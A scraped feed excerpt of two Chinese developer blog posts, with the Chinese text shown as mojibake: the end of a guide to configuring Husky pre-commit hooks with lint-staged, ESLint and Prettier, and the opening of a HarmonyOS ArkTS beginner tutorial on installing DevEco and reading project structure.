<li><strong>eslint-config-prettier:</strong> è§£å†³ ESLint ä¸ Prettier è§„åˆ™å†²çªçš„å…³é”®é…ç½®ã€‚</li>
</ul>
<h3 data-id="heading-1">é…ç½® Huskyï¼šè‡ªåŠ¨åŒ–æ£€æŸ¥çš„â€œå®ˆé—¨å‘˜â€</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Ftypicode.github.io%2Fhusky%2Fzh%2Fget-started.html" target="_blank" title="https://typicode.github.io/husky/zh/get-started.html" ref="nofollow noopener noreferrer">huskyå®˜ç½‘</a>ï¼Œè¿›å»ä¹‹åæŒ‰ç…§å¼•å¯¼å®‰è£…å³å¯</p>
<pre><code class="hljs language-js" lang="js"># å®‰è£… <span class="hljs-title class_">Husky</span>
npm install --save-dev husky

# åˆå§‹åŒ– <span class="hljs-title class_">Husky</span> (ä¼šåœ¨é¡¹ç›®æ ¹ç›®å½•åˆ›å»º .<span class="hljs-property">husky</span> æ–‡ä»¶å¤¹)
npx husky init
</code></pre>
<p><strong>å°è´´å£«:</strong> å¦‚æœä½ çš„é¡¹ç›®å°šæœªè¿›è¡Œ Git åˆå§‹åŒ– (<code>git init</code>)ï¼Œ<code>npx husky init</code> å‘½ä»¤ä¼šæŠ¥é”™æç¤º <code>.git can't be found</code>ã€‚è¯·åŠ¡å¿…å…ˆåˆå§‹åŒ– Git ä»“åº“ï¼Œå†è¿›è¡Œ Husky åˆå§‹åŒ–ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/550fc366805845f0a359ab5edd257b47~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiT5Lia5oqE5Luj56CB6YCJ5omL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764580425&amp;x-signature=Fs47O4OieQpPuUprInVaB%2BFKbIM%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-2">å®‰è£…ç›¸å…³ä¾èµ–</h3>
<p>è¿™é‡Œhuskyåªæ˜¯å¯ä»¥hookåˆ°gitçš„å‘½ä»¤ï¼Œå…·ä½“è¦åšä»€ä¹ˆï¼Œæˆ‘ä»¬è¦è‡ªå®šä¹‰ã€‚<br/>
ä¸ºäº†å®ç°ä»£ç çš„è‡ªåŠ¨åŒ–æ ¼å¼åŒ–å’Œè§„èŒƒæ£€æŸ¥ï¼Œæˆ‘ä»¬éœ€è¦å®‰è£… Prettierã€ESLintï¼Œä»¥åŠå®ƒä»¬çš„é‡è¦è¾…åŠ©å·¥å…· <code>lint-staged</code> å’Œ <code>eslint-config-prettier</code>ã€‚</p>
<pre><code class="hljs language-js" lang="js"># å®‰è£… prettier å’Œ eslint (å¦‚æœè¿˜æ²¡è£…çš„è¯)
npm install --save-dev prettier eslint

# å®‰è£… lint-staged
npm install --save-dev lint-staged

# è§£å†³ <span class="hljs-title class_">Prettier</span> å’Œ <span class="hljs-title class_">ESLint</span> è§„åˆ™å†²çªçš„é‡è¦æ’ä»¶
# (è¿™ä¸ªæ’ä»¶ä¼šå…³é—­æ‰€æœ‰å¯èƒ½ä¸ <span class="hljs-title class_">Prettier</span> å†²çªçš„ <span class="hljs-title class_">ESLint</span> æ ¼å¼åŒ–è§„åˆ™)
npm install --save-dev eslint-config-prettier
</code></pre>
<h3 data-id="heading-3">é…ç½®lint-staged</h3>
<p>åœ¨æˆ‘ä»¬çš„ <code>package.json</code> ä¸­æ·»åŠ  <code>lint-staged</code> çš„é…ç½®ã€‚è¿™å‘Šè¯‰å®ƒå¯¹ä¸åŒç±»å‹çš„æ–‡ä»¶æ‰§è¡Œä»€ä¹ˆæ“ä½œï¼š</p>
<pre><code class="hljs language-js" lang="js">{
  <span class="hljs-string">"scripts"</span>: {
    <span class="hljs-comment">// ... å…¶ä»– scripts</span>
  },
  <span class="hljs-string">"lint-staged"</span>: {
    <span class="hljs-string">"*.{js,jsx,ts,tsx}"</span>: [
      <span class="hljs-string">"prettier --write"</span>,
      <span class="hljs-string">"eslint --fix"</span>
    ],
    <span class="hljs-string">"*.{json,css,md,html}"</span>: [
      <span class="hljs-string">"prettier --write"</span>
    ]
  },
  <span class="hljs-comment">// ... å…¶ä»–ä¾èµ–</span>
}
</code></pre>
<h3 data-id="heading-4">ä¿®æ”¹<code>eslint.config.js</code>é…ç½®</h3>
<p><code>eslint-config-prettier</code> ä¼šå…³é—­æ‰€æœ‰å¯èƒ½ä¸ Prettier æ ¼å¼è§„åˆ™å†²çªçš„ ESLint è§„åˆ™ã€‚åœ¨ Flat Config ä¸­ï¼Œé…ç½®æ˜¯æŒ‰æ•°ç»„é¡ºåºåº”ç”¨çš„ï¼Œåä¸€ä¸ªé…ç½®ä¼šè¦†ç›–å‰ä¸€ä¸ªã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦ç¡®ä¿ <code>eslintConfigPrettier</code> å¤„äºé…ç½®æ•°ç»„çš„<strong>æœ«å°¾</strong>ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 1. å¼•å…¥ prettier é…ç½® </span>
<span class="hljs-keyword">import</span> eslintConfigPrettier <span class="hljs-keyword">from</span> <span class="hljs-string">"eslint-config-prettier"</span>;
<span class="hljs-comment">// 2. å¹¶åœ¨æœ€åæ·»åŠ  eslintConfigPrettier</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>([
  <span class="hljs-title function_">globalIgnores</span>([<span class="hljs-string">"dist"</span>]),
  {
    <span class="hljs-attr">files</span>: [<span class="hljs-string">"**/*.{ts,tsx}"</span>],
    <span class="hljs-attr">extends</span>: [
      js.<span class="hljs-property">configs</span>.<span class="hljs-property">recommended</span>,
      tseslint.<span class="hljs-property">configs</span>.<span class="hljs-property">recommended</span>,
      reactHooks.<span class="hljs-property">configs</span>.<span class="hljs-property">flat</span>.<span class="hljs-property">recommended</span>,
      reactRefresh.<span class="hljs-property">configs</span>.<span class="hljs-property">vite</span>,
    ],
    <span class="hljs-attr">languageOptions</span>: {
      <span class="hljs-attr">ecmaVersion</span>: <span class="hljs-number">2020</span>,
      <span class="hljs-attr">globals</span>: globals.<span class="hljs-property">browser</span>,
    },
  },
  eslintConfigPrettier,
]);
</code></pre>
<h3 data-id="heading-5">ä¿®æ”¹huskyçš„hookå‘½ä»¤</h3>
<p>è¿™é‡Œå°±æ˜¯æœ€åçš„ä¸€æ­¥äº†ï¼Œåœ¨commitçš„æ—¶å€™ï¼Œæˆ‘ä»¬è¦è¿è¡Œä»€ä¹ˆå‘½ä»¤<br/>
ä¿®æ”¹<code>.husky/pre-commit</code>ï¼Œåœ¨é‡Œé¢æ·»åŠ </p>
<pre><code class="hljs">npx lint-staged
</code></pre>
<h3 data-id="heading-6">è‡ªå®šä¹‰ä»£ç è§„èŒƒ</h3>
<p>å¦‚æœæˆ‘ä»¬æƒ³ä¿®æ”¹ä»£ç çš„æ ¼å¼è§„èŒƒï¼Œå¯ä»¥åœ¨<code>prettierrc.json</code>æ–‡ä»¶ä¸­å¯¹å…¶è¿›è¡Œä¿®æ”¹ï¼Œå¦‚æœæ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œåˆ›å»ºä¸€ä¸ªå°±å¥½äº†</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// .prettierrc.json</span>
{
  <span class="hljs-string">"tabWidth"</span>: <span class="hljs-number">4</span>,          <span class="hljs-comment">// ç¼©è¿›å®½åº¦ä¸º 4 ä¸ªç©ºæ ¼</span>
  <span class="hljs-string">"semi"</span>: <span class="hljs-literal">false</span>,          <span class="hljs-comment">// ä¸ä½¿ç”¨åˆ†å·</span>
  <span class="hljs-string">"singleQuote"</span>: <span class="hljs-literal">true</span>,    <span class="hljs-comment">// ä½¿ç”¨å•å¼•å·</span>
  <span class="hljs-string">"printWidth"</span>: <span class="hljs-number">80</span>,       <span class="hljs-comment">// æ¯è¡Œä»£ç æœ€å¤š 80 ä¸ªå­—ç¬¦ (å¯é€‰ï¼Œä½†æ¨è)</span>
  <span class="hljs-string">"trailingComma"</span>: <span class="hljs-string">"all"</span>  <span class="hljs-comment">// å¯¹è±¡æˆ–æ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ åæ€»æ˜¯æ·»åŠ é€—å· (å¯é€‰ï¼Œä½†æ¨è)</span>
}
</code></pre>
<h3 data-id="heading-7">æ€»ç»“</h3>
<p>é€šè¿‡ Huskyã€Prettierã€ESLint å’Œ lint-staged çš„å¼ºå¼ºè”åˆï¼Œæˆ‘ä»¬æ„å»ºäº†ä¸€ä¸ªé«˜æ•ˆä¸”å¼ºå¤§çš„ä»£ç è§„èŒƒè‡ªåŠ¨åŒ–æµç¨‹ã€‚è¿™å°†ï¼š</p>
<ul>
<li><strong>ç»Ÿä¸€ä»£ç é£æ ¼ï¼š</strong> å›¢é˜Ÿæˆå‘˜çš„ä»£ç é£æ ¼å°†é«˜åº¦ä¸€è‡´ï¼Œé™ä½é˜…è¯»æˆæœ¬ã€‚</li>
<li><strong>æå‡ä»£ç è´¨é‡ï¼š</strong> åŠæ—¶å‘ç°æ½œåœ¨çš„ Bug å’Œä¸è§„èŒƒçš„å†™æ³•ã€‚</li>
<li><strong>ä¼˜åŒ–å¼€å‘ä½“éªŒï¼š</strong> æ ¼å¼åŒ–å’Œæ£€æŸ¥åœ¨æäº¤å‰è‡ªåŠ¨å®Œæˆï¼Œæ— éœ€æ‰‹åŠ¨å¹²é¢„ã€‚</li>
<li><strong>ç¡®ä¿é¡¹ç›®å¥åº·ï¼š</strong> ä»æºå¤´æœç»â€œå±å±±â€çš„äº§ç”Ÿï¼Œè®©é¡¹ç›®ä»£ç åº“å§‹ç»ˆä¿æŒå¥åº·å’Œæ˜“äºç»´æŠ¤ã€‚</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é¸¿è’™é›¶åŸºç¡€è¯­æ³•å…¥é—¨ï¼šå¼€å¯ä½ çš„å¼€å‘ä¹‹æ—…]]></title>    <link>https://juejin.cn/post/7576057623742464042</link>    <guid>https://juejin.cn/post/7576057623742464042</guid>    <pubDate>2025-11-24T09:19:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576057623742464042" data-draft-id="7312035320376803354" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é¸¿è’™é›¶åŸºç¡€è¯­æ³•å…¥é—¨ï¼šå¼€å¯ä½ çš„å¼€å‘ä¹‹æ—…"/> <meta itemprop="keywords" content="HarmonyOS,Android,å‰ç«¯"/> <meta itemprop="datePublished" content="2025-11-24T09:19:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="hqk"/> <meta itemprop="url" content="https://juejin.cn/user/2357827986264942"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é¸¿è’™é›¶åŸºç¡€è¯­æ³•å…¥é—¨ï¼šå¼€å¯ä½ çš„å¼€å‘ä¹‹æ—…
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2357827986264942/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    hqk
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T09:19:52.000Z" title="Mon Nov 24 2025 09:19:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»27åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p><code>HarmonyOSæ˜¯æ–°ä¸€ä»£çš„æ™ºèƒ½ç»ˆç«¯æ“ä½œç³»ç»Ÿï¼Œä¸ºä¸åŒè®¾å¤‡çš„æ™ºèƒ½åŒ–ã€äº’è”ä¸ååŒæä¾›äº†ç»Ÿä¸€çš„è¯­è¨€ï¼Œä¸ºç”¨æˆ·å¸¦æ¥ç®€æ·ï¼Œæµç•…ï¼Œè¿ç»­ï¼Œå®‰å…¨å¯é çš„å…¨åœºæ™¯äº¤äº’ä½“éªŒã€‚</code></p>
<p>åœ¨é¸¿è’™æ“ä½œç³»ç»Ÿçš„å¼€å‘ä¸­ï¼Œ<strong>æŒæ¡åŸºç¡€è¯­æ³•æ˜¯æ¯ä½å¼€å‘è€…çš„å¿…ä¿®è¯¾</strong>ã€‚æœ¬æ–‡å°†ä¸ºæ‚¨è¯¦ç»†è®²è§£é¸¿è’™ç¼–ç¨‹çš„åŸºç¡€è¯­æ³•ï¼Œå¸®åŠ©åˆå­¦è€…è½»æ¾å…¥é—¨ï¼Œä¸ºåç»­å¼€å‘æ‰“ä¸‹åšå®åŸºç¡€ã€‚</p>
<p>OKï¼è¯ä¸å¤šè¯´ï¼Œç›´æ¥å¼€å§‹ï¼</p>
<p>æœ¬æ–‡å‚è€ƒäº <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Ftraining%2Fcourse%2FslightMooc%2FC101717496870909384" target="_blank" title="https://developer.huawei.com/consumer/cn/training/course/slightMooc/C101717496870909384" ref="nofollow noopener noreferrer">åä¸ºè¯¾ç¨‹å®˜æ–¹æ–‡æ¡£</a></p>
<h2 data-id="heading-1">1ã€ç¯å¢ƒæ­å»ºä¸ArkTsè¯­è¨€ä»‹ç»</h2>
<h3 data-id="heading-2">1.1 ç¯å¢ƒæ­å»º</h3>
<p><strong>ä¸‹è½½å®˜æ–¹ç¼–è¯‘å™¨</strong></p>
<p>æ—¢ç„¶è¦å¼€å‘é¸¿è’™ç¨‹åºï¼Œé‚£ä¹ˆå°±éœ€è¦å¯¹åº”å®˜æ–¹ç¼–è¯‘å™¨ã€DevEcoã€‘ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdownload%2F" target="_blank" title="https://developer.huawei.com/consumer/cn/download/" ref="nofollow noopener noreferrer">ç‚¹æˆ‘ä¸‹è½½</a>  ï¼ˆé¢å‘å®åè®¤è¯å¼€å‘ï¼Œéœ€è¦æ³¨å†Œç™»å½•åä¸ºè´¦å·ï¼‰</p>
<p><strong>å®‰è£…ç¼–è¯‘å™¨</strong></p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f9c36f6f015140a9a47054b2e5eeaa59~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaHFr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764580791&amp;x-signature=27HF7dFX5FJzSXwJuySpRe9jS9Q%3D" alt="1.jpg" loading="lazy"/></p>
<p>å¦‚å›¾æ‰€ç¤ºï¼š</p>
<ul>
<li>ä¸ºäº†æ–¹ä¾¿åç»­æ“ä½œï¼Œè¿™é‡Œæœ€å¥½æ˜¯å…¨éƒ¨å‹¾ä¸Šï¼Œ<strong>å°¤å…¶æ˜¯ã€æ·»åŠ binã€‘é€‰é¡¹</strong></li>
</ul>
<p><strong>é…ç½®å¼€å‘SDK</strong></p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/560f2877c4a04fa6aa814ac86b38e574~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaHFr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764580791&amp;x-signature=mo2ZFEQrFPdIRBA9JAagazXlVRo%3D" alt="QQ20250109-145958.jpg" loading="lazy"/></p>
<p>å¦‚å›¾æ‰€ç¤ºï¼š</p>
<ul>
<li><code>Location</code>ï¼šé…ç½®å¯¹åº”SDKè·¯å¾„</li>
<li><code>API Version xx</code>ï¼šå¯¹åº”SDKç‰ˆæœ¬ã€æŒ‰éœ€å®‰è£…å³å¯ã€‘</li>
</ul>
<p><strong>å¼€å§‹ç¬¬ä¸€ä¸ªé¡¹ç›®</strong></p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/233e3209665e4842aee94b1c6c77dfed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaHFr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764580791&amp;x-signature=sV52sjDru3PEXF%2BiQbqRJ2GKUA8%3D" alt="2.jpg" width="100%" loading="lazy"/></p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4584aa192f9a4826a247fe0e3edeb216~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaHFr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764580791&amp;x-signature=MMS3dJCgJpmA8Dq5KOSpp4eenc8%3D" alt="3.jpg" width="100%" loading="lazy"/></p>
<p>å¦‚å›¾æ‰€ç¤ºï¼š</p>
<ul>
<li>åˆšå¼€å§‹é€‰æ‹©Empty Abilityï¼Œç„¶åç‚¹å‡»Nextå°±ä¼šè¿›å…¥ç¬¬äºŒä¸ªé¡µé¢</li>
<li>åœ¨ç¬¬äºŒé¡µé¢ä¸­ï¼š
<ul>
<li>ã€Bundle nameã€‘ï¼šè¡¨ç¤ºè¯¥é¸¿è’™è½¯ä»¶å”¯ä¸€æ ‡è¯† ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„åŒ…å</li>
<li>ã€Device typeã€‘ï¼šè¡¨ç¤ºè¯¥é¡¹ç›®æ‰€æ”¯æŒçš„è®¾å¤‡ç±»å‹ï¼Œè¿™ä¹Ÿæ˜¯é¸¿è’™ç‰¹è‰² <strong>ä¸€å¥—ä»£ç å¤šç«¯ä½¿ç”¨</strong></li>
<li>ç‚¹å‡»Next å°±ä¼šè¿›å…¥ä¸‹ä¸€ä¸ªé¡µé¢</li>
</ul>
</li>
</ul>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6b9a1b3e931472b885402a0fcdcfcc4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaHFr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764580791&amp;x-signature=mwm7HyUaucvpWXT8%2FYOy6vYBFY8%3D" alt="4.jpg" loading="lazy"/></p>
<p>å¦‚å›¾æ‰€ç¤ºï¼š</p>
<ul>
<li>
<p>ç‚¹å‡»å·¦è¾¹çš„ã€Previewerã€‘ å·¦ä¾§å°†ä¼šå‡ºç°é¢„è§ˆå›¾ï¼Œå½“é¢„è§ˆå‡ºç°<code>Hello World</code>æ—¶ï¼Œåˆ™è¯´æ˜é¡¹ç›®åˆ›å»ºæˆåŠŸ</p>
</li>
<li>
<p>å›åˆ°é¡¹ç›®å³ä¾§ï¼Œç°åœ¨ä»‹ç»ä¸‹å·¥ç¨‹ç›®å½•ç»“æ„ï¼ˆStageæ¨¡å‹ï¼‰</p>
<ul>
<li>
<p><strong>AppScope &gt; app.json5</strong>ï¼šåº”ç”¨çš„å…¨å±€é…ç½®ä¿¡æ¯ï¼Œè¯¦è§<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdoc%2Fharmonyos-guides-V5%2Fapp-configuration-file-V5" target="_blank" title="https://developer.huawei.com/consumer/cn/doc/harmonyos-guides-V5/app-configuration-file-V5" ref="nofollow noopener noreferrer">app.json5é…ç½®æ–‡ä»¶</a>ã€‚</p>
</li>
<li>
<p><strong>entry</strong>ï¼šHarmonyOSå·¥ç¨‹æ¨¡å—ï¼Œç¼–è¯‘æ„å»ºç”Ÿæˆä¸€ä¸ªHAPåŒ…ã€‚</p>
<ul>
<li><strong>src &gt; main &gt; ets</strong>ï¼šç”¨äºå­˜æ”¾ArkTSæºç ã€‚</li>
<li><strong>src &gt; main &gt; ets &gt; entryability</strong>ï¼šåº”ç”¨/æœåŠ¡çš„å…¥å£ã€‚</li>
<li><strong>src &gt; main &gt; ets &gt; entrybackupability</strong>ï¼šåº”ç”¨æä¾›æ‰©å±•çš„å¤‡ä»½æ¢å¤èƒ½åŠ›ã€‚</li>
<li><strong>src &gt; main &gt; ets &gt; pages</strong>ï¼šåº”ç”¨/æœåŠ¡åŒ…å«çš„é¡µé¢ã€‚</li>
